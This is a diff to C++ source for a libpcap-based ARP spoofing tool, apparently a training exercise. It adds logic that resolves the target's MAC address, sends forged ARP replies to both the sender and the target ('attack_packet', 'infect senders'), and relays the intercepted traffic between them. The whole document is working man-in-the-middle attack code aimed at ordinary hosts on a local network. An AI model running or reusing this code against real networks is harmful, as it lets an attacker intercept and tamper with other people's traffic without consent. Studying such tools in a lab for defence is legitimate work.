@@ -359,7 +359,7 @@ EthArpPacket m_a_packet(Mac me_mac, Ip t_ip, Mac v_mac, Ip v_ip){
 
 }
 
-//TODO : fill m_relay_packet
+
 u_char* m_relay_packet(const u_char* packet, Mac me_mac, Mac t_mac, uint32_t& out_len){
 
     const u_char* cpacket = packet;
@@ -378,6 +378,16 @@ u_char* m_relay_packet(const u_char* packet, Mac me_mac, Mac t_mac, uint32_t& ou
     eth_hdr->dmac_ = t_mac;
     eth_hdr->smac_ = me_mac;
 
+    Mac ssmac = eth_hdr->smac();
+    Mac ddmac = eth_hdr->dmac();
+
+    const uint8_t* smac_ptr = reinterpret_cast<const uint8_t*>(&ssmac);
+    const uint8_t* dmac_ptr = reinterpret_cast<const uint8_t*>(&ddmac);
+
+    printf("[Relay MAC] Src = %02X:%02X:%02X:%02X:%02X:%02X, Dst = %02X:%02X:%02X:%02X:%02X:%02X\n",
+           smac_ptr[0], smac_ptr[1], smac_ptr[2], smac_ptr[3], smac_ptr[4], smac_ptr[5],
+           dmac_ptr[0], dmac_ptr[1], dmac_ptr[2], dmac_ptr[3], dmac_ptr[4], dmac_ptr[5]);
+
     return relay_packet;
 }
 
@@ -395,7 +405,8 @@ int main(int argc, char* argv[]) {
     int repeat_time = argc/2 - 1;
     char* dev = argv[1];
     char errbuf[PCAP_ERRBUF_SIZE];
-    pcap_t* pcap = pcap_open_live(dev, 65535, 1, 1000, errbuf);
+    //pcap_t* pcap = pcap_open_live(dev, 65535, 1, 1000, errbuf);
+    pcap_t* pcap = pcap_open_live(dev, BUFSIZ, 1, 1, errbuf);
 
 
     uint8_t me_mac_ar[6];
@@ -413,20 +424,20 @@ int main(int argc, char* argv[]) {
             return EXIT_FAILURE;
         }
 
-        //2. make request packet
+        //2-1. make request packet (for sender mac)
 
         Ip me_ip = Ip(htonl(get_me_ip(dev))); // GO: check complete 8/7
-
         Ip s_ip = Ip(htonl(c_to_u32_ip(argv[re*2+2]))); // GO : check it's ok to make packet, but wrong to isSreply
 
         EthArpPacket r_packet = m_rq_packet(me_mac, me_ip, s_ip);
-
-
         //send the request_packet
         int res1 = pcap_sendpacket(pcap, reinterpret_cast<const u_char*>(&r_packet), sizeof(EthArpPacket));
         if (res1 != 0) fprintf(stderr, "pcap_sendpacket return %d error=%s\n", res1, pcap_geterr(pcap));
 
-        while (true){
+        Mac s_mac;
+
+        while (true)
+        {
                 struct pcap_pkthdr* header;
                 const u_char* packet;
                 int res = pcap_next_ex(pcap, &header, &packet);
@@ -438,13 +449,17 @@ int main(int argc, char* argv[]) {
 
 
             //3. is_Sreply
-            if(!isSreply(packet, s_ip, me_ip, me_mac ))continue;
+            if(!isSreply(packet, s_ip, me_ip, me_mac))continue;
 
             //4-1. get Smac (sender mac)
-            Mac s_mac = get_s_mac(packet);
+            s_mac = get_s_mac(packet);
 
             //4-2. get Tmac (target mac)
-            Mac t_mac = get_t_mac(packet);
+            /*Mac t_mac = get_t_mac(packet);
+            const uint8_t* tmac_ptr = reinterpret_cast<const uint8_t*>(&t_mac);
+            printf("[First t_mac] = %02X:%02X:%02X:%02X:%02X:%02X\n",
+                   tmac_ptr[0], tmac_ptr[1], tmac_ptr[2], tmac_ptr[3], tmac_ptr[4], tmac_ptr[5]);*/
+           //debug
 
             //5. make sender attack packet
             Ip t_ip = Ip(c_to_u32_ip(argv[re*2+3]));
@@ -454,7 +469,8 @@ int main(int argc, char* argv[]) {
 
 
             EthArpPacket attack_packet = m_a_packet(me_mac, ttt_ip, s_mac, s_ip); //sender
-            EthArpPacket attack_packet_target = m_a_packet(me_mac, s_ip, t_mac, ttt_ip); //TODO : check is it right in wireshark
+
+            //EthArpPacket attack_packet_target = m_a_packet(me_mac, s_ip, t_mac, ttt_ip); //TODO : maybe under gogo
 
             //6-1. send the attack_packet (sender)
             int res2 = pcap_sendpacket(pcap, reinterpret_cast<const u_char*>(&attack_packet), sizeof(EthArpPacket));
@@ -462,22 +478,101 @@ int main(int argc, char* argv[]) {
                 fprintf(stderr, "pcap_sendpacket return %d error=%s\n", res2, pcap_geterr(pcap));
             }
 
-            //6-2. send the attack_packet (target)
+            //6-2. send the attack_packet (target) //TODO : maybe under gogo
+            // target thinks sender's mac is me
+            //int res3 = pcap_sendpacket(pcap, reinterpret_cast<const u_char*>(&attack_packet_target), sizeof(EthArpPacket));
+            //if (res3 != 0) {
+            //    fprintf(stderr, "pcap_sendpacket return %d error=%s\n", res3, pcap_geterr(pcap));
+            //}
+
+            //spoof_flows.push_back({s_ip, ttt_ip, s_mac, me_mac, true, t_mac});
+            //spoof_flows.push_back({ttt_ip, s_ip, t_mac, me_mac, true, s_mac}); //TODO : maybe under gogo
+
+            //pcap_close(pcap);
+            break;
+        }
+
+
+        //2-2. make request packet (for target mac)
+
+        /*-----------------------------------------------*/
+
+        Ip t_ip = Ip(htonl(c_to_u32_ip(argv[re*2+3]))); // GO : check it's ok to make packet, but wrong to isSreply
+
+        EthArpPacket r_packet_t = m_rq_packet(me_mac, me_ip, t_ip);
+        //send the request_packet
+        int res6 = pcap_sendpacket(pcap, reinterpret_cast<const u_char*>(&r_packet_t), sizeof(EthArpPacket));
+        if (res6 != 0) fprintf(stderr, "pcap_sendpacket return %d error=%s\n", res6, pcap_geterr(pcap));
+
+        while (true)
+        {
+            struct pcap_pkthdr* header;
+            const u_char* packet;
+            int res = pcap_next_ex(pcap, &header, &packet);
+            if (res == 0) continue;
+            if (res == PCAP_ERROR || res == PCAP_ERROR_BREAK) {
+                printf("pcap_next_ex return %d(%s)\n", res, pcap_geterr(pcap));
+                break;
+            }
+
+
+            //3. is_Sreply
+            if(!isSreply(packet, t_ip, me_ip, me_mac))continue;
+
+            //4-1.
+            Mac t_mac = get_s_mac(packet);
+
+            /*debug */
+            const uint8_t* tmac_ptr = reinterpret_cast<const uint8_t*>(&t_mac);
+            printf("[First t_mac] = %02X:%02X:%02X:%02X:%02X:%02X\n",
+                   tmac_ptr[0], tmac_ptr[1], tmac_ptr[2], tmac_ptr[3], tmac_ptr[4], tmac_ptr[5]);
+            /*debug*/
+
+
+            //5. make target attack packet
+            EthArpPacket attack_packet_target = m_a_packet(me_mac, s_ip, t_mac, t_ip); //sender
+
+
+            //6. send the attack_packet (target)
             // target thinks sender's mac is me
             int res3 = pcap_sendpacket(pcap, reinterpret_cast<const u_char*>(&attack_packet_target), sizeof(EthArpPacket));
             if (res3 != 0) {
                 fprintf(stderr, "pcap_sendpacket return %d error=%s\n", res3, pcap_geterr(pcap));
             }
 
-            spoof_flows.push_back({s_ip, ttt_ip, s_mac, me_mac, true, t_mac});
-            spoof_flows.push_back({ttt_ip, s_ip, t_mac, me_mac, true, s_mac});
-
+            spoof_flows.push_back({s_ip, t_ip, s_mac, me_mac, true, t_mac});
+            spoof_flows.push_back({t_ip, s_ip, t_mac, me_mac, true, s_mac}); //TODO : maybe under gogo
 
             //pcap_close(pcap);
             break;
-
             }
     }
+
+
+    /*-----------------------------------------------*/
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
 
 
     /* GO : 1. infect senders end */
@@ -502,7 +597,7 @@ int main(int argc, char* argv[]) {
         //1. send relay packet
         for (int i=0; i<spoof_flows.size(); i++)
         {
-            //TODO : check is it IP
+
              if(!spoof_flows[i].haveToRelay||!isSpoofed(packet, spoof_flows[i].s_ip, spoof_flows[i].t_ip, spoof_flows[i].s_mac, spoof_flows[i].t_mac)) continue;
 
              uint32_t relay_len = 0;
